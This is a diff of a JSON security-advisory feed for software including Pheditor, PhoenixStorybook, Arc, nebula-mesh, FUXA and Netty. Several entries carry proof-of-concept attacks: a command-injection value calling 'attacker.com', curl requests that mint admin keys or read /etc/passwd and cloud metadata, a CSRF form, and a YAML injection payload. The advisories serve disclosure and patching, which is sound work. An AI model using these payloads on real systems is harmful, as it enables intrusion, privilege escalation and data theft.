+      "cve_ids": [
+        "CVE-2026-47767"
+      ],
       "is_zero_day": true,
       "is_high_severity": false
     },
@@ -443,11 +421,11 @@
       "is_high_severity": false
     },
     {
-      "id": "CVE-2026-47734",
-      "title": "Dulwich has unbounded memory allocation in receive-pack from crafted thin packs",
-      "summary": "## Impact\n\nAn uncontrolled-resource-consumption (memory exhaustion) denial-of-service vulnerability (CWE-400 / CWE-789).\n\nA client with push access could push a tiny crafted thin pack (~174 bytes)  whose delta header declares a huge   dest_size. When dulwich ingested it via  add_thin_pack / apply_delta, it would  allocate hundreds of MB of memory based on that attacker-controlled size, with no relationship to the actual bytes received.\n\nWho is impacted: Operators running a Dulwich-based Git server that exposes git-receive-pack (i.e. accepts pushes) -\nfor example via dulwich.server functionality, the HTTP  smart server, or anything built on ReceivePackHandler. \n\n## Patches\n\nPatched in 1.2.5.\n\nadd_thin_pack now accepts a max_input_size keyword (bytes; 0/None = unlimited, matching git's semantics), and ReceivePackHandler reads receive.maxInputSize from the repository config and passes it through. Wire reads are counted and a PackInputTooLarge exception is raised once the cap is exceeded - equivalent to git index-pack --max-input-size.\n\nUsers should upgrade to Dulwich 1.2.5 or later and set receive.maxInputSize in their server's repository config to a sane bound for their environment.\n\n## Workarounds\n\nOn unpatched versions, receive.maxInputSize has no effect, so it cannot be used as a workaround. Until upgrading, operators should:\n\n- Restrict dulwich-receive-pack (push) access to trusted, authenticated clients only, or disable it entirely on servers that only need to serve fetches.\n- Run the server under an OS-level memory limit (e.g. ulimit, cgroups/MemoryMax, or a container memory limit) so a malicious push is killed rather than taking down the host.\n\n##  Resources\n\n- git's receive.maxInputSize / git index-pack --max-input-size documentation \n- Reported by Liyi, Ziyue, Strick, Maurice and Chenchen @ University of Sydney",
-      "link": "https://github.com/advisories/GHSA-xrvj-v92f-53gj",
-      "published": "2026-06-08T23:43:42Z",
+      "id": "CVE-2026-48030",
+      "title": "Pheditor: OS Command Injection in terminal handler via unsanitized 'dir' parameter",
+      "summary": "### Summary\n\nAn OS Command Injection vulnerability in the terminal action handler allows any authenticated user to execute arbitrary OS commands by injecting shell metacharacters into the 'dir' POST parameter, completely bypassing the TERMINAL_COMMANDS whitelist and achieving full Remote Code Execution with web server privileges.\n\n### Details\n\nThe terminal handler in pheditor.php accepts two POST parameters: `command` and `dir`. Shell metacharacters are validated on `$command` only \u2014 `$dir` is passed to shell_exec() without any sanitization.\n\nVulnerable code (pheditor.php, line 554\u2013586):\n\n```php\n$command = $_POST['command'];  // \u2713 metacharacters checked\n$dir     = $_POST['dir'];      // \u2717 NOT checked \u2014 vulnerable\n\nif (strpos($command, '&')  !== false ||\n    strpos($command, ';')  !== false ||\n    strpos($command, '||') !== false) {\n    die(...); // only guards $command, not $dir\n}\n\n$output = shell_exec(\n    (empty($dir) ? null : 'cd ' . $dir . ' && ')\n    . $command . ' && echo \\ ; pwd'  // \u2190 $dir injected here\n);\n```\n\nAn attacker sends `dir=/tmp; curl attacker.com #` \u2014 the semicolon in $dir is never checked, so the injected command executes freely.\n\nFix: replace `$dir` with `escapeshellarg($dir)` on line 586.\n\n### PoC\n\nRequirements: valid credentials, terminal permission enabled (default)\n\nStep 1 \u2014 Authenticate:\n\n```bash\ncurl -c cookies.txt -X POST http://TARGET/pheditor.php \\\n  -d \"pheditor_password=admin\" -L > /dev/null\n```\n\nStep 2 \u2014 Get CSRF token:\n\n```bash\nTOKEN=$(curl -s -b cookies.txt http://TARGET/pheditor.php | \\\n  grep -o 'token = \"[a-f0-9]*\"' | \\\n  grep -o '\"[a-f0-9]*\"' | tr -d '\"')\n```\n\nStep 3 \u2014 Confirm curl is blocked via command field:\n\n```bash\ncurl -s -b cookies.txt -X POST http://TARGET/pheditor.php \\\n  --data-urlencode \"action=terminal\" \\\n  --data-urlencode \"token=$TOKEN\" \\\n  --data-urlencode \"command=curl https://ifconfig.me\" \\\n  --data-urlencode \"dir=/tmp\"\n\n\n\u2192 {\"error\":true,\"message\":\"Command not allowed\"}\n```\n\nStep 4 \u2014 Bypass whitelist via dir in",
+      "link": "https://github.com/advisories/GHSA-jvc5-6g7q-c843",
+      "published": "2026-06-09T22:00:35Z",
       "source": "GitHub Security Advisories",
       "tags": [
         "github",
@@ -455,10 +433,28 @@
         "oss"
       ],
       "cve_ids": [
-        "CVE-2026-47734"
+        "CVE-2026-48030"
       ],
-      "is_zero_day": true,
-      "is_high_severity": false
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-8467",
+      "title": "PhoenixStorybook: Unauthenticated remote code execution via HEEx template injection in phoenix_storybook playground",
+      "summary": "### Summary\nAn unsafe HEEx template generation vulnerability allows any unauthenticated user to execute arbitrary code on the server. The phoenix_storybook playground accepts user-controlled attribute values over WebSocket and interpolates them unsanitized into a HEEx template that is subsequently compiled and evaluated with full Elixir `Kernel` access.\n\n### Details\nThe vulnerability is a three-step chain:\n\n**1. Unsanitized WebSocket input (`extra_assigns_helpers.ex`)**\nThe `psb-assign` event handler in `PhoenixStorybook.Story.PlaygroundPreviewLive` accepts arbitrary attribute names and values from unauthenticated WebSocket clients and  stores them verbatim via `ExtraAssignsHelpers.handle_set_variation_assign/3`.\n\n**2. Unescaped interpolation into HEEx (`component_renderer.ex`)**\n`ComponentRenderer.attributes_markup/1` builds a HEEx template string by interpolating binary attribute values directly:\n```elixir\n{name, val} when is_binary(val) ->\n  ~s|#{name}=\"#{val}\"|\n```\nNo escaping of `\"` or `{` is performed. A value such as `foo\" injected={EXPR} bar=\"` breaks out of the attribute string and injects `EXPR` as an inline HEEx expression.\n\n**3. Unsandboxed evaluation (`component_renderer.ex`)**\nThe resulting HEEx string is compiled via `EEx.compile_string/2` and evaluated via `Code.eval_quoted_with_env/3` with full `Kernel` imports and no sandbox. The injected expression executes on the server even if it causes a rendering error.\n\n### PoC\n1. Identify any story URL with a Playground tab (e.g. `/storybook/core_components/button`).\n2. Connect to the Phoenix LiveView WebSocket without any authentication.\n3. Join the story's LiveView channel and send a `psb-assign` event with an attribute value that escapes the HEEx attribute context and embeds an Elixir expression (e.g. a `System.cmd/2` call).\n4. The server evaluates the injected expression and returns its output in the rendered response.\n\nNo authentication, no special configuration, and no user interaction are required.\n\n#",
+      "link": "https://github.com/advisories/GHSA-55hg-8qxv-qj4p",
+      "published": "2026-06-09T21:58:57Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-8467"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
     },
     {
       "id": "https://thehackernews.com/2026/06/veeam-backup-replication-rce-flaw-lets.html",
@@ -490,150 +486,6 @@
       ],
       "cve_ids": [
         "CVE-2026-25112"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47735",
-      "title": "Arc has an authenticated arbitrary local-file read via DuckDB I/O functions that bypasses RBAC table-level checks",
-      "summary": "### Summary\n\nArc's user-SQL validator (`internal/api/query.go:ValidateSQLRequest`) blocked only `read_parquet(` and `arc_partition_agg(` via regex denylist. The broader DuckDB I/O function family \u2014 `read_csv_auto`, `read_csv`, `read_json`, `read_json_auto`, `read_text`, `read_blob`, `glob`, `parquet_metadata`, `parquet_schema`, `read_xlsx`, etc. \u2014 was not blocked. RBAC table-reference extraction inspected only `FROM`/`JOIN` clauses, so scalar table functions in the `SELECT` list slipped past both layers.\n\n### Impact\n\nAny authenticated user, including a token with `permissions: []`, can read arbitrary local files via:\n\n```\nPOST /api/v1/query\nAuthorization: Bearer <token>\n{\"sql\": \"SELECT * FROM read_csv_auto('/etc/passwd', header=false, columns={'l':'VARCHAR'}) LIMIT 5\"}\n```\n\nConfirmed reachable targets:\n\n- `auth.db` \u2014 bcrypt hashes for every API token, plus legacy SHA-256 rows.\n- `arc.toml` \u2014 S3 secrets, TLS keys.\n- `/proc/self/environ` \u2014 environment-variable secrets.\n- Cross-tenant Parquet files \u2014 bypasses RBAC because the tenant scope is enforced at the table layer, not on raw file paths.\n- SSRF when `httpfs` is loaded (any S3-backed deployment) \u2014 `read_csv_auto('http://169.254.169.254/latest/meta-data/...')` reaches instance metadata IPs.\n\n### Patches\n\nFixed in 2026.06.1 (PR #442) via a structural sandbox at the DuckDB layer:\n\n1. `SET GLOBAL allowed_directories = [...]` enumerates Arc's legitimate filesystem prefixes (storage roots + tier prefixes + import upload dir + compaction temp).\n2. `SET GLOBAL enable_external_access = false` (one-way at runtime).\n3. Verified by reading back the flag.\n\nAfter lockdown, DuckDB refuses to open any file outside the allowlist and refuses further `INSTALL`/`LOAD`. Already-loaded extensions remain callable.\n\n### Workarounds\n\n- Restrict API access to known-trusted networks via firewall rules.\n- Temporary mitigation: add `read_csv*`/`read_json*`/`glob` etc. to `dangerousSQLPattern` in `internal/api/query.go` pending 2026.06.1.\n\n### ",
-      "link": "https://github.com/advisories/GHSA-p2j4-c4g6-rpf5",
-      "published": "2026-06-08T23:51:19Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47735"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47726",
-      "title": "nebula-mesh: GET /api/v1/audit-log discloses all entries to any operator",
-      "summary": "`internal/api/audit.go:12` \u2014 `handleGetAuditLog` does no admin check. The route is bearer-auth gated only; any operator API key returns the full audit log via `store.ListAuditEntries` (up to limit=1000). This includes cross-tenant actor names, host/CA/operator IDs, action timestamps, and masked-IP entries from rate-limit refusals \u2014 enough surface for a tenant to enumerate the server's activity, infer staffing patterns, or identify high-value targets.\n\n## Affected\nAll released versions up to v0.3.1.\n\n## Reproducer\n```\ncurl -H \"Authorization: Bearer <any-operator-key>\" \\\n  https://server/api/v1/audit-log?limit=1000\n```\n\n## Suggested fix\nTwo options, either acceptable:\n\n1. `if !actorIsAdmin(ctx) { 403 }` \u2014 strictest; matches the \"operator management is admin-only\" stance.\n2. Scope to actor: filter `store.ListAuditEntries` by `actor.Username` plus a subquery of CA IDs the actor owns. Operators see their own audit entries plus entries against their CA's resources.\n\nRecommend option 1 unless the UI needs per-operator audit views.\n\n## Suggested patch\n\nVerified locally: `go vet`, `go test -race -count=1 ./...`, `golangci-lint v2.12` all clean.\n\n```diff\ndiff --git a/internal/api/audit.go b/internal/api/audit.go\nindex 3236631..57b57ce 100644\n--- a/internal/api/audit.go\n+++ b/internal/api/audit.go\n@@ -10,6 +10,10 @@ import (\n const defaultAuditLimit = 100\n \n func (s *Server) handleGetAuditLog(w http.ResponseWriter, r *http.Request) {\n+\tif !actorIsAdmin(r.Context()) {\n+\t\twriteError(w, http.StatusForbidden, \"audit log access requires the admin role\")\n+\t\treturn\n+\t}\n \tfilter := store.AuditFilter{\n \t\tAction: r.URL.Query().Get(\"action\"),\n \t\tLimit:  defaultAuditLimit,\ndiff --git a/internal/api/audit_admin_test.go b/internal/api/audit_admin_test.go\nnew file mode 100644\nindex 0000000..47e1ca4\n--- /dev/null\n+++ b/internal/api/audit_admin_test.go\n@@ -0,0 +1,62 @@\n+package api\n+\n+import (\n+\t\"context\"\n+\t\"crypto/sha256\"\n+\t\"encoding/hex\"\n+\t\"net/http\"\n+\t\"net/http/httptest\"\n+\t\"testing\"\n+\n+\t\"gi",
-      "link": "https://github.com/advisories/GHSA-qm33-p5p9-f8vg",
-      "published": "2026-06-08T23:35:55Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47726"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47725",
-      "title": "nebula-mesh's web UI lacks CSRF tokens on /ui/* mutating endpoints",
-      "summary": "Every `/ui/*` POST / PUT / PATCH / DELETE route processes the request as soon as the session cookie validates. `SameSite=Lax` on the session cookie prevents most cross-site form submits but does not protect:\n\n- top-level form-submit navigations from third-party pages (some browsers still send Lax cookies on top-level POSTs)\n- same-registrable-domain attackers (sibling-subdomain XSS, subdomain takeover)\n- the `GET /ui/logout` route, which a third-party `<img src=\".../ui/logout\">` can force-trigger\n\nThe admin UI signs CA certificates, mints API keys, rotates / retires / deletes CAs, disables operators, and changes server settings. CSRF here is a real privilege escalation, not just annoyance.\n\n## Affected\nAll released versions up to v0.3.2.\n\n## Suggested fix\nDouble-submit cookie: a 32-byte `crypto/rand` token in a non-HttpOnly `_csrf` cookie, echoed in either `X-CSRF-Token` (htmx) or a `_csrf` form field (HTML forms). Compared in constant time. Rotated on every privilege transition (`Login`, OIDC `StartAuthenticatedSession`, `CompleteTwoFactor`, `Logout`) so pre-auth fixation cannot survive promotion. Rejections audit-logged as `ui.csrf.rejected` with reason; response body stays opaque.\n\n`/ui/logout` becomes POST so it is no longer reachable via `<img>` tags.\n\nFix coordinates with the Secure-cookie advisory disclosed concurrently \u2014 the `_csrf` cookie inherits the same `Secure`-attribute derivation.\n\n## Reproducer\nWith an authenticated operator session in browser tab A, open the following minimal HTML in any other tab:\n\n```html\n<form action=\"https://nebula.example.com/ui/cas/{ca-id}/delete\" method=\"POST\">\n  <button>Click for free puppy</button>\n</form>\n```\n\nClick. The CA is deleted \u2014 the server processes the POST because the session cookie is automatically attached and there is no other check. The same trick works for force-rotate, retire, mint API keys, disable operators, etc.\n\nAlternative force-logout: `<img src=\"https://nebula.example.com/ui/logout\">` placed on an at",
-      "link": "https://github.com/advisories/GHSA-273q-qgh5-wrj6",
-      "published": "2026-06-08T23:09:21Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47725"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47724",
-      "title": "nebula-mesh: API endpoints lack ownership checks, enabling cross-operator privilege escalation",
-      "summary": "The `/api/v1/*` route surface trusts the bearer token alone for authorisation on most endpoints. The codebase itself admits this at `internal/api/hosts.go:384`: *\"API trusts the bearer token for authorisation; per-CA ownership is enforced only in the Web layer.\"*\n\nThe Web UI gates state-changing routes through `loadAccessibleCA` (`internal/web/cas.go`); CA-management endpoints in `internal/api/cas.go` ALSO have proper `canAccessCA` gates. **The gap is on the host, network, firewall, mobile-bundle, and most operator endpoints.** Combined with the per-operator CA model from ADR 0002, this gives any non-admin operator API key broad cross-tenant access \u2014 instant privilege escalation in the worst case.\n\n## Affected\nAll released versions prior to v0.3.4.\n\n## Exploit chain\n\n### A) Mint admin API key from any operator key (instant privilege escalation)\n`internal/api/operators.go:118` \u2014 `handleCreateOperatorAPIKey` does no admin check and no actor/target-operator ownership check. Any operator key can call it for any operator (including admins) and receive a fresh bearer.\n\n```\ncurl -X POST -H \"Authorization: Bearer <low-priv-key>\" \\\n  https://server/api/v1/operators/<admin-id>/api-keys \\\n  -H 'Content-Type: application/json' -d '{\"name\":\"oops\"}'\n# Returns: {\"key\":\"<32-byte admin bearer>\",\"entry\":{...}}\n```\n\nReuse the returned key for subsequent requests \u2192 full admin.\n\n### B) Cross-operator host takeover via reenroll\n`internal/api/hosts.go:321,330` \u2192 `mintEnrollmentTokenForHost`. Looks up host by URL param, mints a single-use enrollment token, returns it. No ownership check.\n\n```\ncurl -X POST -H \"Authorization: Bearer <low-priv-key>\" \\\n  https://server/api/v1/hosts/<victim-host-id>/reenroll\n# Returns: {\"enrollment_token\":\"<uuid>\",...}\n```\n\nCaller POSTs `/api/v1/enroll` with their own X25519 + Ed25519 keypairs. `enroll.go:175` overwrites `signing_pub_pem`; `SaveCertificateAndEnrollHost` overwrites the cert. Legitimate agent's next signed poll fails `bad_signature`. Attacker now",
-      "link": "https://github.com/advisories/GHSA-598g-h2vc-h5vg",
-      "published": "2026-06-08T23:09:02Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47724"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47723",
-      "title": "nebula-mesh: Web UI and API responses lack security headers (CSP, X-Frame-Options, HSTS, etc.)",
-      "summary": "None of the response paths in `internal/web/` or `internal/api/` set the standard browser-security headers. `grep` for `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy` returns zero matches across the codebase.\n\n## Impact\nThe admin UI signs CA certificates, mints API keys (returned inline once per page), displays TOTP QR codes, and exposes operator-management forms. Missing `X-Frame-Options: DENY` / `frame-ancestors 'none'` is a real clickjacking lever against an admin browsing `/ui/operators/*` or `/ui/cas/*`. Missing `X-Content-Type-Options: nosniff` allows MIME confusion on any user-supplied content surface. Missing HSTS on TLS deployments leaves a downgrade window.\n\n## Affected\nAll released versions up to v0.3.0.\n\n## Suggested fix\nA single response-header middleware mounted at the chi router root in both `/ui/*` and `/api/*` paths:\n\n```go\nfunc securityHeadersMiddleware(next http.Handler) http.Handler {\n    return http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {\n        h := rw.Header()\n        h.Set(\"Content-Security-Policy\",\n            \"default-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'\")\n        h.Set(\"X-Content-Type-Options\", \"nosniff\")\n        h.Set(\"Referrer-Policy\", \"same-origin\")\n        h.Set(\"X-Frame-Options\", \"DENY\")  // belt-and-braces; CSP frame-ancestors is the modern path\n        if r.TLS != nil {\n            h.Set(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        }\n        next.ServeHTTP(rw, r)\n    })\n}\n```\n\nThe inline `<script>` in `layout.html` for CSRF wiring (added in the CSRF advisory) will need either a nonce, a hash in CSP, or external-file extraction. Easiest path: a nonce per request (`crypto/rand`, base64) injected into both the CSP header and the script's `nonce=\"\"` attribute.",
-      "link": "https://github.com/advisories/GHSA-w7w5-5gcp-38rw",
-      "published": "2026-06-08T23:08:54Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47723"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47722",
-      "title": "nebula-mesh: Host advanced overrides allow YAML injection into agent config.yml",
-      "summary": "`internal/configgen/generator.go:86,108,119` interpolates the operator-supplied `ListenHost` and `TunDevice` fields raw into a `text/template` that produces the agent's `config.yml`. `internal/web/advanced.go:20-35` accepts both with only `strings.TrimSpace` \u2014 no character or shape validation.\n\n## Exploit\nAn operator (or attacker with any operator key, given the cross-tenant CRUD advisory) sets `adv_tun_device` to:\n\n```\nnebula0\nlighthouse:\n  am_lighthouse: true\n  hosts: [\"10.0.0.1\"]\n#\n```\n\nThe agent fetches the rendered config on its next signed poll. On config reload, it loads the injected YAML keys: the host self-promotes to lighthouse, attracts mesh traffic, or sets `am_relay: true` to be selected as a relay. The `ListenHost` field has the same shape.\n\n## Affected\nAll released versions prior to v0.3.2.\n\n## Threat model\n- **Today**: operator can compromise their own host's config (trivially allowed if they own the host, but they can also set lighthouse/relay flags that the operator-create form does NOT expose \u2014 privilege uplift within their own tenant).\n- **Combined with the critical /api/v1 authz advisory**: any operator key can mutate ANOTHER tenant's host overrides and inject YAML there.\n- **Post-fix of the authz advisory**: still relevant \u2014 the agent unconditionally trusts whatever config the server hands it, so any future operator-impersonation bug re-amplifies this.\n\n## Suggested fix\nTwo options, either acceptable:\n\n1. **Input validation** in `parseAdvancedFromForm` (`internal/web/advanced.go`):\n   - `ListenHost`: regex `^[A-Za-z0-9.:\\[\\]_-]+$` (IPv4/IPv6/hostname)\n   - `TunDevice`: regex `^[A-Za-z0-9_-]{1,15}$` (Linux IFNAMSIZ caps at 15)\n   Reject invalid input with a form-level error; do not write to the host row.\n\n2. **Safer marshalling**: switch `configgen/generator.go` to marshal a typed Go struct via `gopkg.in/yaml.v3` (which escapes correctly) instead of `text/template` string-concat. Larger change, but eliminates this entire injection class.\n\nOption",
-      "link": "https://github.com/advisories/GHSA-7hp6-g3pq-3pc3",
-      "published": "2026-06-08T23:08:15Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47722"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47719",
-      "title": "FUXA: Unauthenticated SSRF via Socket.IO DEVICE_WEBAPI_REQUEST and DEVICE_PROPERTY with response reading",
-      "summary": "## Summary\n\nAn unauthenticated attacker (Alice) connects to FUXA's Socket.IO endpoint and emits a `device-webapi-request` event whose `property.address` field names an arbitrary URL. FUXA's `DEVICE_WEBAPI_REQUEST` handler at `server/runtime/index.js:296` calls `axios.get(address)` server-side and broadcasts the full response body back on the same event via `io.emit`. The companion handler `DEVICE_PROPERTY` at `server/runtime/index.js:153` has the same miss against OPC UA and ODBC endpoints. Both handlers skip the `isSocketWriteAuthorized()` check that the other write-capable events (`DEVICE_VALUES` at line 182, `DEVICE_ENABLE` at line 358) call. Alice reads cloud instance metadata, scans internal services, and connects to any OPC UA server or ODBC database the FUXA host can reach, then receives the results.\n\n## Details\n\n**Vulnerable handlers**: `server/runtime/index.js:153-171, 296-316`:\n\n```javascript\nsocket.on(Events.IoEventTypes.DEVICE_PROPERTY, (message) => {\n    try {\n        if (message && message.endpoint && message.type) {\n            devices.getSupportedProperty(message.endpoint, message.type).then(result => {\n                message.result = result;\n                io.emit(Events.IoEventTypes.DEVICE_PROPERTY, message);\n            })\n            // ...\n        }\n    }\n    // ...\n});\n\nsocket.on(Events.IoEventTypes.DEVICE_WEBAPI_REQUEST, (message) => {\n    try {\n        if (message && message.property) {\n            devices.getRequestResult(message.property).then(result => {\n                message.result = result;\n                io.emit(Events.IoEventTypes.DEVICE_WEBAPI_REQUEST, message);\n            })\n            // ...\n        }\n    }\n    // ...\n});\n```\n\n**Sink**: `server/runtime/devices/httprequest/index.js:471` for the webapi path:\n\n```javascript\nif (property.method === 'GET') {\n    axios.get(property.address).then(res => {\n        resolve(res.data);\n    // ...\n```\n\nAlice fully controls `property.address`, and `io.emit` echoes the response body back o",
-      "link": "https://github.com/advisories/GHSA-w86f-rf9w-h3x6",
-      "published": "2026-06-08T23:06:40Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47719"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-45536",
-      "title": "Netty: Unix-socket fd receive leaks descriptors when peer sends two at once",
-      "summary": "netty_unix_socket_recvFd sets msg_control to `char control[CMSG_SPACE(sizeof(int))]` (line 940) \u2014 24 bytes on 64-bit Linux. A peer-sent SCM_RIGHTS cmsg carrying two ints has cmsg_len = CMSG_LEN(8) = 24, which fits exactly with no MSG_CTRUNC, so the kernel installs both fds in the receiving process. The subsequent check `cmsg->cmsg_len == CMSG_LEN(sizeof(int))` (line 972, expected 20) fails, the branch that would read the fd is skipped, and neither installed fd is closed. The for(;;) loop calls recvmsg again (non-blocking \u2192 EAGAIN \u2192 Java maps to 0 \u2192 read loop exits normally), leaving two leaked fds per message. There is no MSG_CTRUNC handling. Reachable via Epoll/KQueue DomainSocketChannel when the application opts into DomainSocketReadMode.FILE_DESCRIPTORS (non-default).",
-      "link": "https://github.com/advisories/GHSA-w573-9ffj-6ff9",
-      "published": "2026-06-08T23:01:33Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-45536"
       ],
       "is_zero_day": false,
       "is_high_severity": true
